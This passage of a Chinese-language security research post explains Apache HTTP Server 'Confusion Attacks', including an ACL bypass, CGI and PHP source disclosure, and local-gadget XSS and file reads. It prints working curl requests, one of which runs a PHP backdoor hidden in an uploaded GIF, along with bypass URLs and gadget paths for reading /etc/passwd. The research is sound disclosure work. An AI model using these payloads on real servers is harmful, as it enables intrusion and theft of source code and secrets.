+<p>如果請求附檔名是 <code>.php</code> 結尾則加上 <code>mod_php</code> 相對應的處理器 (此外也可以是環境變數或是 <code>Content-Type</code>，關於標誌的詳細設定可參考官方的手冊 <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/rewrite/flags.html">RewriteRule Flags</a>)。</p>
+<p>由於 <code>mod_rewrite</code> 的截斷行為發生在正規表達式匹配後，因此惡意的攻擊者可以利用原本的規則，透過 <code>?</code> 將 <code>RewriteFlag</code> 設定到不屬於它們的請求上。 例如上傳一個夾帶惡意 PHP 程式碼的 GIF 圖片並透過惡意請求將圖片當成後門執行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/upload/1.gif</span><br><span class="line"> <span class="comment"># GIF89a &lt;?=`id`;&gt;</span></span><br><span class="line"></span><br><span class="line">$ curl http://server/upload/1.gif%3fooo.php</span><br><span class="line"> <span class="comment"># GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br></pre></td></tr></table></figure>
+<h3 id="⚔️-Primitive-1-2-ACL-Bypass"><a href="#⚔️-Primitive-1-2-ACL-Bypass" class="headerlink" title="⚔️ Primitive 1-2. ACL Bypass"></a>⚔️ Primitive 1-2. ACL Bypass</h3><p>Filename Confusion 的第二個攻擊手法發生在 <code>mod_proxy</code> 身上，相較前一個攻擊是無條件將目標當成網址處理，這次則是<strong>因為模組間對 <code>r-&gt;filename</code> 的理解不一致所導致的認證及存取控制繞過</strong>！</p>
+<p><code>mod_proxy</code> 會將 <code>r-&gt;filename</code> 當成網址這件事情其實很合理，因為原本 Proxy 的目的就是將請求「導向」到其它網址上，但安全往往就是單獨拿出來看沒問題，搭配在一起就出問題了！ 特別是當大多數模組預設將 <code>r-&gt;filename</code> 視為檔案系統路徑時，試想一下假設今天你使用基於檔案系統的存取控制模組，而現在 <code>mod_proxy</code> 又會把 <code>r-&gt;filename</code> 當成網址，這其中的不一致就可以導致存取控制或是認證被繞過！</p>
+<p>一個經典的例子是，網站管理員透過 <code>Files</code> 語法去對單一檔案加上限制，例如 <code>admin.php</code>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files <span class="string">&quot;admin.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">AuthType</span> Basic </span><br><span class="line">    <span class="attribute">AuthName</span> <span class="string">&quot;Admin Panel&quot;</span></span><br><span class="line">    <span class="attribute">AuthUserFile</span> <span class="string">&quot;/etc/apache2/.htpasswd&quot;</span></span><br><span class="line">    <span class="attribute">Require</span> valid-user</span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在預設安裝的 PHP-FPM 環境中，這種設定可以被直接繞過！ 順道一提這也是 Apache HTTP Server 中最常見到的認證方式！ 假設今天你瀏覽了這樣的網址：</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;admin.php%3Fooo.php</p>
+</blockquote>
+<p>首先在這個網址的 HTTP 生命週期中，認證模組會將請求的檔案名稱與被保護的檔案進行比對，此時 <code>r-&gt;filename</code> 欄位是 <code>admin.php?ooo.php</code> 理所當然與 <code>admin.php</code> 不符合，於是模組會認為當前請求不需要認證。 然而 PHP-FPM 的設定檔案又設定當收到結尾為 <code>.php</code> 的請求時透過 <code>SetHandler</code> 語法將請求轉交給 <code>mod_proxy</code>：</p>
+<p><em><strong>Path: &#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php8.2-fpm.conf</strong></em></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using (?:pattern) instead of (pattern) is a small optimization that</span></span><br><span class="line"><span class="comment"># avoid capturing the matching pattern (as $1) which isn&#x27;t used here</span></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;.+\.ph(?:ar|p|tml)$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> <span class="string">&quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;</span></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>mod_proxy</code> 會將 <code>r-&gt;filename</code> 重寫成以下網址並根據其中的協議呼叫子模組 <code>mod_proxy_fcgi</code> 處理後續 FastCGI 協議的邏輯：</p>
+<blockquote>
+<p>proxy:fcgi:&#x2F;&#x2F;127.0.0.1:9000&#x2F;var&#x2F;www&#x2F;html&#x2F;admin.php?ooo.php</p>
+</blockquote>
+<p>由於這時後端在收到檔案名稱時已經是一個奇怪的格式了，PHP-FPM 只好對這個行為做特別處理，其中處理的邏輯如下：</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044">sapi&#x2F;fpm&#x2F;fpm&#x2F;fpm_main.c#L1044</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> APACHE_PROXY_FCGI_PREFIX <span class="string">&quot;proxy:fcgi://&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APACHE_PROXY_BALANCER_PREFIX <span class="string">&quot;proxy:balancer://&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (env_script_filename &amp;&amp;</span><br><span class="line">    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, <span class="keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* advance to first character of hostname */</span></span><br><span class="line">    <span class="type">char</span> *p = env_script_filename + (<span class="keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (*p != <span class="string">&#x27;\0&#x27;</span> &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">        p++;    <span class="comment">/* move past hostname and port */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*p != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">/* Copy path portion in place to avoid memory leak.  Note</span></span><br><span class="line"><span class="comment">         * that this also affects what script_path_translated points</span></span><br><span class="line"><span class="comment">         * to. */</span></span><br><span class="line">        memmove(env_script_filename, p, <span class="built_in">strlen</span>(p) + <span class="number">1</span>);</span><br><span class="line">        apache_was_here = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ignore query string if sent by Apache (RewriteRule) */</span></span><br><span class="line">    p = <span class="built_in">strchr</span>(env_script_filename, <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p) &#123;</span><br><span class="line">        *p =<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到 PHP-FPM 先對檔案名稱正規化並對其中的問號 <code>?</code> 進行分隔取出其中實際的檔案路徑並執行 (也就是 <code>/var/www/html/admin.php</code>)。 所以基本上<strong>所有使用 <code>Files</code> 語法針對單一 PHP 檔案的認證或是存取控制設定在運行 PHP-FPM 的情境下都存在風險！</strong> 😮</p>
+<p>從 GitHub 上可以找到非常多潛在有風險的設定，例如被限制在只有內網才能存取的 <code>phpinfo()</code>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># protect phpinfo, only allow localhost and local network access</span></span><br><span class="line"><span class="section">&lt;Files php-info.php&gt;</span></span><br><span class="line">    <span class="comment"># LOCAL ACCESS ONLY</span></span><br><span class="line">    <span class="comment"># Require local </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># LOCAL AND LAN ACCESS</span></span><br><span class="line">    <span class="attribute">Require</span> ip <span class="number">10</span> <span class="number">172</span> <span class="number">192</span>.<span class="number">168</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用 <code>.htaccess</code> 阻擋起來的 Adminer：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files adminer.php&gt;</span></span><br><span class="line">    <span class="attribute">Order</span> <span class="literal">Allow</span>,<span class="literal">Deny</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>被保護起來的 <code>xmlrpc.php</code>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files xmlrpc.php&gt;</span></span><br><span class="line">    <span class="attribute">Order</span> <span class="literal">Allow</span>,<span class="literal">Deny</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>防止直接存取的命令行工具：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Files <span class="string">&quot;cron.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">Deny</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br></pre></td></tr></table></figure>
+<p>透過認證模組以及 <code>mod_proxy</code> 間對 <code>r-&gt;filename</code> 欄位理解的不一致，上面所有的例子都可以透過一個 <code>?</code> 成功繞過！</p>
+<h2 id="🔥-2-DocumentRoot-Confusion"><a href="#🔥-2-DocumentRoot-Confusion" class="headerlink" title="🔥 2. DocumentRoot Confusion"></a>🔥 2. DocumentRoot Confusion</h2><p>接下來要介紹的攻擊是基於 DocumentRoot 上的 Confusion Attack！ 首先你可以思考一下，對於下面這樣子的 Httpd 設定：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DocumentRoot</span> /var/www/html</span><br><span class="line"><span class="attribute">RewriteRule</span>  ^/html/(.*)$   /$<span class="number">1</span>.html</span><br></pre></td></tr></table></figure>
+<p>當瀏覽 <code>http://server/html/about</code> 時，到底實際 Httpd 會開啟哪個檔案？ 是根目錄下的 <code>/about.html</code> 還是 DocumentRoot 下的 <code>/var/www/html/about.html</code> 呢？</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/cb68682cbd04105d-03.png"></p>
+<p>答案是 —— <strong>兩個路徑都會存取</strong>。 這也是我們的第二個 Confusion Attack，<strong>對於任意<sup>[1]</sup>的 <code>RewriteRule</code>，Httpd 總是會嘗試開啟帶有 DocumentRoot 的路徑以及沒有的路徑！</strong> 有趣吧 😉</p>
+<p><em>[1] 位於 <code>Server Config</code> 或 <code>VirtualHost Block</code> 內</em></p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939">modules&#x2F;mappers&#x2F;mod_rewrite.c#L4939</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(!(conf-&gt;options &amp; OPTION_LEGACY_PREFIX_DOCROOT)) &#123;</span><br><span class="line">        uri_reduced = apr_table_get(r-&gt;notes, <span class="string">&quot;mod_rewrite_uri_reduced&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prefix_stat(r-&gt;filename, r-&gt;pool) || uri_reduced != <span class="literal">NULL</span>) &#123;     <span class="comment">// &lt;------ [1] access without root</span></span><br><span class="line">        <span class="type">int</span> res;</span><br><span class="line">        <span class="type">char</span> *tmp = r-&gt;uri;</span><br><span class="line"></span><br><span class="line">        r-&gt;uri = r-&gt;filename;</span><br><span class="line">        res = ap_core_translate(r);             <span class="comment">// &lt;------ [2] access with root</span></span><br><span class="line">        r-&gt;uri = tmp;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res != OK) &#123;</span><br><span class="line">            rewritelog((r, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&quot;prefixing with document_root of %s&quot;</span></span><br><span class="line">                        <span class="string">&quot; FAILED&quot;</span>, r-&gt;filename));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rewritelog((r, <span class="number">2</span>, <span class="literal">NULL</span>, <span class="string">&quot;prefixed with document_root to %s&quot;</span>,</span><br><span class="line">                    r-&gt;filename));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rewritelog((r, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="string">&quot;go-ahead with %s [OK]&quot;</span>, r-&gt;filename));</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>當然絕大部分的情況是目標檔案不存在，於是 Httpd 會存取帶有 DocumentRoot 的版本，但這個行為已經讓我們能夠「故意的」去存取 Web Root 以外的路徑，<strong>如果今天可以控制 <code>RewriteRule</code> 的目標前綴那我們是不是就能瀏覽作業系統上的任意檔案了？</strong> 這也是我們第二個 Confusion Attack 的精神！ 從 GitHub 中可以找到千千萬萬個有問題的寫法，有趣的是甚至連<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query">官方的範例文件</a>都是易遭受攻擊的：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Remove mykey=???</span></span><br><span class="line"><span class="attribute">RewriteCond</span> <span class="string">&quot;%&#123;QUERY_STRING&#125;&quot;</span> <span class="string">&quot;(.*(?:^|&amp;))mykey=([^&amp;]*)&amp;?(.*)&amp;?$&quot;</span></span><br><span class="line"><span class="attribute">RewriteRule</span> <span class="string">&quot;(.*)&quot;</span> <span class="string">&quot;$1?%1%3&quot;</span></span><br></pre></td></tr></table></figure>
+<p>除此之外還有其它亦受影響的 <code>RewriteRule</code> 例如基於快取需求或是將想副檔名隱藏起來的 URL Masking 規則：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/html/(.*)$&quot;</span>  <span class="string">&quot;/$1.html&quot;</span></span><br></pre></td></tr></table></figure>
+<p>或是想節省流量，嘗試使用壓縮版本的靜態檔案規則：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^(.*)\.(css|js|ico|svg)&quot;</span> <span class="string">&quot;$1\.$2.gz&quot;</span></span><br></pre></td></tr></table></figure>
+<p>將老舊的網站轉址到根目錄的規則：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/oldwebsite/(.*)$&quot;</span>  <span class="string">&quot;/$1&quot;</span></span><br></pre></td></tr></table></figure>
+<p>對所有 CORS 的預檢請求都回傳 200 OK 的規則：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_METHOD&#125;</span> OPTIONS</span><br><span class="line"><span class="attribute">RewriteRule</span> ^(.*)$ $<span class="number">1</span><span class="meta"> [R=200,L]</span></span><br></pre></td></tr></table></figure>
+<p>理論上只要 <code>RewriteRule</code> 的目標前綴可控，我們可以瀏覽幾乎整個檔案系統，但從前面的規則中發現還有一個限制我們必須跨過的，前面例子中所出現的副檔名如 <code>.html</code> 以及 <code>.gz</code> 的後綴都是讓我們沒那麼地自由的一個限制 —— 所以可以繞過這個限制嗎？ 不知道有沒有人想起前面在 Filename Confusion 章節所介紹的路徑截斷，透過這兩個攻擊的結合，我們可以自由的瀏覽作業系統上的任意檔案！</p>
+<p>接下來的範例都基於這個不安全的 <code>RewriteRule</code> 來做示範：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span>  <span class="string">&quot;^/html/(.*)$&quot;</span>  <span class="string">&quot;/$1.html&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="⚔️-Primitive-2-1-Server-Side-Source-Code-Disclosure"><a href="#⚔️-Primitive-2-1-Server-Side-Source-Code-Disclosure" class="headerlink" title="⚔️ Primitive 2-1. Server-Side Source Code Disclosure"></a>⚔️ Primitive 2-1. Server-Side Source Code Disclosure</h3><p>首先來介紹 DocumentRoot Confusion 的第一個攻擊手法 —— <strong>任意伺服器端程式碼洩漏</strong>！</p>
+<p>由於 Httpd 會根據當前目錄或是當前虛擬主機設定決定是否當成 Server-Side Script 處理，因此透過絕對路徑去存取目標程式碼可以混淆 Httpd 的邏輯導致洩漏原本該被當成程式碼執行的檔案內容。</p>
+<h4 id="✔️-2-1-1-Disclose-CGI-Source-Code"><a href="#✔️-2-1-1-Disclose-CGI-Source-Code" class="headerlink" title="✔️ 2-1-1. Disclose CGI Source Code"></a>✔️ 2-1-1. Disclose CGI Source Code</h4><p>首先是洩漏伺服器端的 CGI 程式碼，由於 <code>mod_cgi</code> 是透過 <code>ScriptAlias</code> 將 CGI 目錄與所指定的 URL 前綴綁定起來，當使用絕對路徑直接瀏覽 CGI 時由於 URL 前綴變了，因此可以直接洩漏出檔案原始碼。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/cgi-bin/download.cgi</span><br><span class="line"> <span class="comment"># the processed result from download.cgi</span></span><br><span class="line">$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F</span><br><span class="line"> <span class="comment"># #!/usr/bin/perl</span></span><br><span class="line"> <span class="comment"># use CGI;</span></span><br><span class="line"> <span class="comment"># ...</span></span><br><span class="line"> <span class="comment"># # the source code of download.cgi</span></span><br></pre></td></tr></table></figure>
+<h4 id="✔️-2-1-2-Disclose-PHP-Source-Code"><a href="#✔️-2-1-2-Disclose-PHP-Source-Code" class="headerlink" title="✔️ 2-1-2. Disclose PHP Source Code"></a>✔️ 2-1-2. Disclose PHP Source Code</h4><p>接著是洩漏伺服器端的 PHP 程式碼，由於 PHP 的使用場景眾多，若只針對特定目錄或是虛擬主機套用 PHP 環境的話 (常見於網站代管服務)，可以透過未啟用 PHP 的虛擬主機存取 PHP 檔案以洩漏原始碼！</p>
+<p>例如 <code>www.local</code> 以及 <code>static.local</code> 兩個虛擬主機都託管在同一台伺服器上，<code>www.local</code> 允許運行 PHP 而 <code>static.local</code> 則純粹負責處理靜態檔案，因此可以透過下面的方式洩漏出 <code>config.php</code> 內的敏感資訊：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://www.local/config.php</span><br><span class="line"> <span class="comment"># the processed result (empty) from config.php</span></span><br><span class="line">$ curl http://www.local/var/www.local/config.php%3F -H <span class="string">&quot;Host: static.local&quot;</span></span><br><span class="line"> <span class="comment"># the source code of config.php</span></span><br></pre></td></tr></table></figure>
+<h3 id="⚔️-Primitive-2-2-Local-Gadgets-Manipulation"><a href="#⚔️-Primitive-2-2-Local-Gadgets-Manipulation" class="headerlink" title="⚔️ Primitive 2-2. Local Gadgets Manipulation!"></a>⚔️ Primitive 2-2. Local Gadgets Manipulation!</h3><p>接下來是我們的第二個攻擊手法 —— <strong>Local Gadgets Manipulation</strong>。</p>
+<p>首先，在前面介紹到「瀏覽作業系統上的任意檔案」時不知道你有沒有好奇： 「欸那是不是一個不安全的 <code>RewriteRule</code> 就可以存取到 <code>/etc/passwd</code>？」 對的 —— 但也不完全對。 蛤？</p>
+<p>技術上來說確實伺服器會去檢查 <code>/etc/passwd</code> 是否存在，但 Apach HTTP Server 內建的存取控制阻擋了我們的存取，這裡是 Apache HTTP Server 的<a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">設定檔模板內容</a>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<p>會觀察到預設阻擋了根目錄 <code>/</code> 的瀏覽 (<code>Require all denied</code>)，然而實際上這就沒戲了嗎？ 實際上再詳細追查各個 Httpd 的發行版會發現 <a target="_blank" rel="noopener" href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165">Debian&#x2F;Ubuntu</a> 作業系統預設允許了 <code>/usr/share</code>：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /usr/share&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以我們的「任意檔案存取」似乎有點那麼地不任意。 不過我們打破原本只能瀏覽 DocumentRoot 的信任算是跨出很大的一步了。 接下來要做的事情就是「壓榨」這個目錄內的各種可能。　所有可利用的資源、目錄中現有的教學範例、說明文件、單元測試檔案，甚至伺服器上程式語言如 PHP、Python 甚至 PHP 的模組都有機會成為我們濫用的對象！</p>
+<p><em>P.S. 當然上面只是基於 Ubuntu&#x2F;Debian 作業系統發行的 Httpd 版本設定做解釋，實務上也有發現一些應用軟體直接把的根目錄的 <code>Require all denied</code> 移除導致可以直接存取 <code>/etc/passwd</code></em></p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/92f358a5ab548ae0-04.png"></p>
+<h4 id="✔️-2-2-1-Local-Gadget-to-Information-Disclosure"><a href="#✔️-2-2-1-Local-Gadget-to-Information-Disclosure" class="headerlink" title="✔️ 2-2-1. Local Gadget to Information Disclosure"></a>✔️ 2-2-1. Local Gadget to Information Disclosure</h4><p>首先來尋找看看這個目錄下是否存在這一些檔案是可以利用的。 首先是目標 Apache HTTP Server 如果安裝 <code>websocketd</code> 這個服務的話，服務套件預設會在 <code>/usr/share/doc/websocketd/examples/php/</code> 下放置一個範例 PHP 程式碼 <code>dump-env.php</code>，如果目標伺服器上存在 PHP 環境的話可以直接存取這個範例程式去洩漏敏感的環境變數。</p>
+<p>另外如果目標同時安裝如 Nginx 或是 Jetty 的話，雖然 <code>/usr/share</code> 理論上該是套件安裝時所存放的唯讀複本，但這些服務的預設 Web Root 就在 <code>/usr/share</code> 下，因此也能透過這個攻擊手法去洩漏這些網頁應用的敏感資訊，例如 Jetty 上的 <code>web.xml</code> 設定等等：</p>
+<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</li>
+<li>&#x2F;usr&#x2F;share&#x2F;jetty9&#x2F;etc&#x2F;</li>
+<li>&#x2F;usr&#x2F;share&#x2F;jetty9&#x2F;webapps&#x2F;</li>
+</ul>
+<p>這裡簡單展示一個透過存取 <code>Davical</code> 套件所存在的 <code>setup.php</code> 唯讀複本去洩漏 <code>phpinfo()</code> 內容。</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/b891865923d68362-05.png"></p>
+<h4 id="✔️-2-2-2-Local-Gadget-to-XSS"><a href="#✔️-2-2-2-Local-Gadget-to-XSS" class="headerlink" title="✔️ 2-2-2. Local Gadget to XSS"></a>✔️ 2-2-2. Local Gadget to XSS</h4><p>接著如何把這個攻擊手法轉化成 XSS 呢？ 在 Ubuntu Desktop 環境中預設會安裝 LibreOffice 這套開源的辦公室應用，利用其中幫助文件的語言切換功能來完成 XSS。</p>
+<p><em><strong>Path: &#x2F;usr&#x2F;share&#x2F;libreoffice&#x2F;help&#x2F;help.html</strong></em></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line"><span class="keyword">var</span> n = url.<span class="title function_">indexOf</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (n != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// the URL came from LibreOffice help (F1)</span></span><br><span class="line">    <span class="keyword">var</span> version = <span class="title function_">getParameterByName</span>(<span class="string">&quot;Version&quot;</span>, url);</span><br><span class="line">    <span class="keyword">var</span> query = url.<span class="title function_">substr</span>(n + <span class="number">1</span>, url.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">var</span> newURL = version + <span class="string">&#x27;/index.html?&#x27;</span> + query;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(newURL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;latest/index.html&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此就算目標沒有部署任何網頁應用，我們也可以利用一個不安全的 <code>RewriteRule</code> 透過作業系統自帶的檔案來創造出 XSS。</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/7ca2c0badb60f2df-06.png"></p>
+<h4 id="✔️-2-2-3-Local-Gadget-to-LFI"><a href="#✔️-2-2-3-Local-Gadget-to-LFI" class="headerlink" title="✔️ 2-2-3. Local Gadget to LFI"></a>✔️ 2-2-3. Local Gadget to LFI</h4><p>至於任意檔案讀取呢？ 如果目標伺服器上安裝了一些 PHP 甚至前端應用套件，例如 JpGraph、jQuery-jFeed 甚至 WordPress 或 Moodle 外掛，那麼它們自帶的使用教學或是除錯用程式碼都可以變成利用的對象，例如：</p>
+<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;doc&#x2F;libphp-jpgraph-examples&#x2F;examples&#x2F;show-source.php</li>
+<li>&#x2F;usr&#x2F;share&#x2F;javascript&#x2F;jquery-jfeed&#x2F;proxy.php</li>
+<li>&#x2F;usr&#x2F;share&#x2F;moodle&#x2F;mod&#x2F;assignment&#x2F;type&#x2F;wims&#x2F;getcsv.php</li>
+</ul>
+<p>這裡展示利用 jQuery-jFeed 所自帶的 <code>proxy.php</code> 來讀取 <code>/etc/passwd</code>：</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/59b47f0ae6d8d13b-07.png"></p>
